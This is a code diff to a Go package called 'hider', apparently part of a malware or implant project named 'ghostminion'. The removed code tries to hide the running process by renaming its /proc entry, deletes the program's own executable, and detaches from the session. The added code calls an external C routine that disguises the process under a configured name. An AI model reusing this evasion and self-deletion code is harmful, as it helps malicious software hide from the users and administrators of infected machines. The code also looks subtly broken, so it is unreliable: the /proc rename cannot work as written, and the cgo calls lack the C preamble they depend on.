@@ -1,46 +1,26 @@
 package hider
 
 import (
+	"C"
+	"fmt"
+	"ghostminion/config"
 	"ghostminion/logger"
-	"os"
-	"strconv"
-	"golang.org/x/sys/unix"
+	"unsafe"
 )
 
-var lgr = logger.GetLogger()
+var (
+	lgr = logger.GetLogger()
+	cfg = config.GetInstance()
+)
 
 func Hide() {
 	lgr.Debug("Hiding process begins")
-	err := hideProcess()
-	if err != nil {
-		lgr.Error("Error hiding process:", err.Error())
+	cname := C.CString(cfg.Apps.Hider.NewProcessName)
+	defer C.free(unsafe.Pointer(cname))
+	ret := C.run_hider(cname)
+	if ret != 0 {
+		fmt.Println("Hider encountered an error")
+	} else {
+		fmt.Println("Hider executed successfully")
 	}
-	err = deleteSelf()
-	if err != nil {
-		lgr.Error("Error deleting self:", err.Error())
-	}
-}
-
-func hideProcess() error {
-	// needs more research (probably won't work if you are not root?)
-	pid := os.Getpid()
-	newName := "/tmp/." + strconv.Itoa(pid)
-	oldPath := "/proc/" + strconv.Itoa(pid)
-	if err := os.Rename(oldPath, newName); err != nil {
-		return err
-	}
-	return nil
-}
-
-func deleteSelf() error {
-	if exe, err := os.Executable(); err != nil {
-		return err
-	} else if err = os.Remove(exe); err != nil {
-		return err
-	}
-	return nil
-}
-
-func Detach() {
-	_, _ = unix.Setsid()
 }
